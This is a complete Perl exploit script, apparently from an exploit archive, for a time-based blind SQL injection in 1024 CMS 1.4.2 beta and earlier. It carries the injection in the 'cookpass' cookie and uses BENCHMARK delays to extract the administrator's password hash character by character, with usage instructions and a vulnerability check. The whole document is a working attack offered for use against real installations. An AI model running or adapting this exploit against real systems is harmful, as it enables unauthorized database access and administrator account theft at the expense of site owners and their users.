###  Start Exploit  ###

#!/usr/bin/perl -w
# 1024 CMS <= 1.4.2 (beta) Remote Blind SQL Injection
# Admin Hash Retrieve Exploit

use LWP::UserAgent;
use HTTP::Request;

if(not defined $ARGV[0])
{
	print "usage: perl $0 [host] [path]\n";
	print "example: perl $0 localhost /1024/\n";
	exit;
}

my $client =  new LWP::UserAgent;
my @cset   =  (48..57, 97..102); 
my $hash   =  undef;
 
my $host  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
   $host .=  $ARGV[1] unless not defined $ARGV[1];

banner();
check_vuln($host) or die "[-] Site not vulnerable: maybe magic_quotes_gpc = On\n\n";
syswrite(STDOUT, "[+] Admin Hash: ");

for($j = 1; $j <= 32; $j++)
{  
    for($i = 0; $i <= $#cset; $i++)
    {
        $pre_time = time();	
	
	 $rv = check_char($cset[$i], $j);
	 $post_time = time();	 
	
         if($post_time - $pre_time > 3 and $rv)
	 {
	     $hash .= chr($cset[$i]); 
             syswrite(STDOUT, chr($cset[$i]), 1);
	     last;
	 }
    }
}

if(not defined $hash or length($hash) != 32)
{
     print STDOUT "\n[-] Exploit mistake: please check the benchmark and the sql query\n\n";
}
else 
{
     print STDOUT "\n[+] Exploit terminated\n\n";
}


sub banner
{
   print "\n";
   print "[+] 1024 CMS <= 1.4.2 (beta) Remote Blind SQL Injection\n";
   print "[+] Admin Hash Retrieve Exploit\n";
   print "[+] Coded by __GiReX__\n";
   print "\n";
}

sub check_vuln
{
  my $target = shift;

     $get = new HTTP::Request(GET, $target);
     $get->header(Cookie => "cookpass=-1'; cookuid=0; cooktype=0; cooklogged=0; cookuser=0");

     $res = $client->request($get);
     
     if($res->is_success) 
     {
         return 1 if $res->as_string =~ /Cannot check combination/;
     }
     else
     {
	die "[-] Invalid target : ${target}\n\n";
     }

  return 0;
}

sub check_char
{
  my ($char, $n) = @_;
   
    $get->header(Cookie =>  'cookpass=-1\'+AND+'.
			    'CASE+WHEN(SELECT ASCII(SUBSTRING(password,'.$n.',1))+'.
			    'FROM+otatf_users+WHERE+id=1)='.$char.'+'.
                            'THEN+BENCHMARK(90000000,CHAR(0))+END#; '.
			    'cookuid=1; cooktype=1; cooklogged=1; cookuser=1'); 

    $res = $client->request($get);

  return $res->is_success;
}